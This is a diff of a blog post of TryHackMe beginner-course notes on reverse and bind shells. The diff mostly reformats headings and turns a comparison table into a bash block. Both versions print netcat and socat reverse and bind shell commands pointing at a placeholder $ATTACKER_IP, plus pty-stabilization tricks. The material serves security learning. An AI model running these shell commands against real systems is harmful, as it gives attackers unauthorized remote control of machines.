@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Complete Beginner'
-date: 2021-10-27 05:00:00.000000000 Z
+date: 2021-10-27 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2021-10-27-tryhackme-complete-beginner.html
 author: 100007
@@ -9,14 +9,14 @@ author: 100007
 <h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2021-10-27</p>
-<h2 id="what-the-shell">What the Shell?</h2>
-<h3 id="what-is-a-shell">What Is a Shell?</h3>
+<h1 id="what-the-shell">What the Shell?</h1>
+<h2 id="what-is-a-shell">What Is a Shell?</h2>
 <p>Terminology:</p>
 <ul>
 <li>REVERSE SHELLS are shells where the target is forced to connect back to the attacker.</li>
 <li>BIND SHELLS are shells bound to a port on the target that the attacker can connect to later.</li>
 </ul>
-<h3 id="tools">Tools</h3>
+<h2 id="tools">Tools</h2>
 <p>Typical tools for creating reverse shells or connecting to bind shells:</p>
 <ul>
 <li><code class="language-plaintext highlighter-rouge">netcat</code> (<code class="language-plaintext highlighter-rouge">nc</code>) is present on just about every UNIX-like system. It can do just about everything, but can be a little bit unstable when constructing reverse shells.</li>
@@ -33,7 +33,7 @@ author: 100007
 <ul>
 <li><a href="https://cardboard-iguana.com/notes/metasploit.html">Using Metasploit</a></li>
 </ul>
-<h3 id="types-of-shells">Types of Shells</h3>
+<h2 id="types-of-shells">Types of Shells</h2>
 <p>Example reverse shell:</p>
 <ul>
 <li>Attacker: <code class="language-plaintext highlighter-rouge">nc -lvnp $LISTENER_PORT</code></li>
@@ -46,9 +46,9 @@ author: 100007
 </ul>
 <p>These are almost, but not quite, mirror images of each other.</p>
 <p>Most initial reverse shells (in particular web shells) are non-interactive.</p>
-<h3 id="netcat">Netcat</h3>
+<h2 id="netcat">Netcat</h2>
 <p>While binding to well-known ports requires the use of sudo, it’s also less likely to get flagged/blocked by intermediate firewalls.</p>
-<h3 id="netcat-shell-stabilization">Netcat Shell Stabilization</h3>
+<h2 id="netcat-shell-stabilization">Netcat Shell Stabilization</h2>
 <p>One thing that causes a reverse shell to be non-interactive is when its running in a shell itself. It’s generally possible to stabilize these and get a fully interactive shell on UNIX-like systems:</p>
 <ul>
 <li>Start an instance of bash connected to an actual PTY: <code class="language-plaintext highlighter-rouge">env TERM=xterm python -c 'import pty; pty.spawn("/bin/bash")'</code></li>
@@ -66,39 +66,25 @@ author: 100007
 <ul>
 <li><a href="https://cardboard-iguana.com/notes/quick-n-dirty-python-web-server.html">Quick-n-Dirty Python Web Server</a></li>
 </ul>
-<h3 id="socat">Socat</h3>
+<h2 id="socat">Socat</h2>
 <p>Socat: Just an anything-to-anything connector!</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">Role</th>
-<th style="text-align: left">netcat</th>
-<th style="text-align: left">socat</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left">Reverse shell (attacker)</td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">nc -lnp $LISTENER_PORT</code></td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">socat TCP-LISTEN:$LISTENER_PORT -</code></td>
-</tr>
-<tr>
-<td style="text-align: left">Reverse shell (target)</td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash</code></td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"</code></td>
-</tr>
-<tr>
-<td style="text-align: left">Bind shell (attacker)</td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">nc $TARGET_IP $LISTENER_PORT</code></td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">socat TCP:$TARGET_IP:$LISTENER_PORT</code></td>
-</tr>
-<tr>
-<td style="text-align: left">Bind shell (target)</td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">nc -lnp $LISTENER_PORT -e /bin/bash</code></td>
-<td style="text-align: left"><code class="language-plaintext highlighter-rouge">socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"</code></td>
-</tr>
-</tbody>
-</table>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reverse shell (attacker)</span>
+<span class="c">#</span>
+nc <span class="nt">-lnp</span> <span class="nv">$LISTENER_PORT</span>
+socat TCP-LISTEN:<span class="nv">$LISTENER_PORT</span> -
+<span class="c"># Reverse shell (target)</span>
+<span class="c">#</span>
+nc <span class="nv">$ATTACKER_IP</span> <span class="nv">$LISTENER_PORT</span> <span class="nt">-e</span> /bin/bash
+socat TCP:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span> EXEC:<span class="s2">"/bin/bash -li"</span>
+<span class="c"># Bind shell (attacker)</span>
+<span class="c">#</span>
+nc <span class="nv">$TARGET_IP</span> <span class="nv">$LISTENER_PORT</span>
+socat TCP:<span class="nv">$TARGET_IP</span>:<span class="nv">$LISTENER_PORT</span>
+<span class="c"># Bind shell (target)</span>
+<span class="c">#</span>
+nc <span class="nt">-lnp</span> <span class="nv">$LISTENER_PORT</span> <span class="nt">-e</span> /bin/bash
+socat TCP-LISTEN:<span class="nv">$LISTENER_PORT</span> EXEC:<span class="s2">"/bin/bash -li"</span>
+</code></pre></div></div>
 <p>This gets us an interactive login shell right out the gate, though we’re still vulnerable to Ctrl+C. Note that when binding to PowerShell, use <code class="language-plaintext highlighter-rouge">powershell.exe,pipes</code> in order to force PowerShell to use UNIX-style STDIN/STDOUT.</p>
 <p>We can use socat to create an auto-stabilized reverse shell on UNIX-like systems (though we will still need to use <code class="language-plaintext highlighter-rouge">stty</code> to set rows/columns).</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attacker: Connect $LISTENER_PORT to the current TTY,</span>
@@ -113,8 +99,8 @@ socat TCP-LISTEN:<span class="nv">$LISTENER_PORT</span> FILE:<span class="sb">`<
 <span class="c"># stderr - redirect STDERR to the attacker</span>
 <span class="c"># sigint - pass signals (Ctrl+C) through</span>
 <span class="c"># setsid - use a new session</span>
-<span class="c"># sane - use a variety of tweaks to “normalize” the</span>
-<span class="c"># terminal’s environment</span>
+<span class="c"># sane - use a variety of tweaks to "normalize" the</span>
+<span class="c"># terminal's environment</span>
 <span class="c">#</span>
 socat TCP:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span> <span class="se">\</span>
 EXEC:<span class="s2">"/bin/bash -li"</span>,pty,stderr,sigint,setsid,sane
